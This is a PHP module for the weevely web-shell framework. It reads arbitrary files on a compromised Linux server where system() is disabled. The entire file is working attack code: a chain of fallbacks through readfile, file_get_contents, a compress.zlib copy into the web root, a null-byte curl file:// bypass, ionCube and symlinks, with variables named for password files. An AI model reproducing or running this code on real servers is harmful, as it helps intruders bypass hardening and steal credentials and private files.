//Author: Hyp3rInj3cT10n, source edit for weevely by Alessio Dalla Pizza
//Description: Read any files where system() functions are not available.
//Arguments: path
//OS:Linux
$file=$ar[0];
error_reporting(0);

echo "readfile($file)\n";
if ( is_callable('readfile') && $read=readfile("$file")) {
    echo $read;
    $done=1;
}
if(!$done)
{
	echo "file_get_contents($file)\n";
	if(is_callable('file_get_contents')) {
	    $passwd = file_get_contents("$file");
	    if ( $passwd )
	    {
		    echo($passwd);
		    $done=1;
	    }
	}

	if(!$done) { 
	  echo "copy($file)\n";

	  if(is_callable('copy')) {
	      if ( @copy("compress.zlib://$file",dirname($_SERVER['SCRIPT_FILENAME'])."/file.txt") )
	      {
		      echo "File copied in ".dirname($_SERVER['SCRIPT_FILENAME'])."/file.txt\n";
		      $done=1;
	      }
	  }
	  
	  if(!$done){

	      echo "curl_exec($file)\n";
	      if ( is_callable('curl_init') && is_callable('curl_exec') ) {

		    $passwdA = @curl_init("file://$file\x00".__FILE__);
		    if ( @curl_exec($passwdA) )
		    {
			    var_dump(@curl_exec($passwdA));
			    $done=1;
		    }
	      }
	      if(!$done) {
		  echo "ioncube_read_file($file)\n";

		  if(@extension_loaded('ionCube Loader')) {
		      $passwdB = @ioncube_read_file("$file");
		      if ( $passwdB && count($passwdB)>1 ) {
			echo($passwdB);
			$done=1;
		      }
		  }

		  if(!$done) {
		      if ( is_callable('symlink') ) {
			  if ( @symlink($file,"file") ) {
			      echo "File linked in ".dirname($_SERVER['SCRIPT_FILENAME'])."/file\n";
			      $done=1;
			  }
		      }
		  }
	      }
	  }
    }
}
if(!$done) {
  echo "All failed.\n";
}
